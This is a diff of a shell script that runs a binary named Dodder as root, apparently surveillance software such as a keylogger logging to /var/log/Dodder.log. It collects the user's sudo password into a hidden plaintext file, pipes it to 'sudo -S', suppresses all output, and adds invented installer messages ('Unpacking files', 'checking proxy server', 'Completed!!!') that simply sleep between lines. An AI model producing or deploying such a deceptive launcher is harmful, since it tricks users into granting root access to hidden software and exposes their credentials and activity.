@@ -24,5 +24,24 @@ do
         echo "[sudo], try again."
     fi
 done
-sudo -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null
+sudo -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null 2>&1
 rm $DIR/.pass
+
+sleep 1
+echo "Initializing"
+sleep 2
+echo "Copying files ..."
+sleep 2
+echo "Unpacking files ..."
+sleep 2
+echo "Configuring settings ..."
+sleep 1
+echo "checking proxy server"
+sleep 1
+echo "Configuring ports"
+sleep 1
+echo "applying changes"
+sleep 1
+echo "saving changes"
+sleep 1
+echo "Completed!!!"
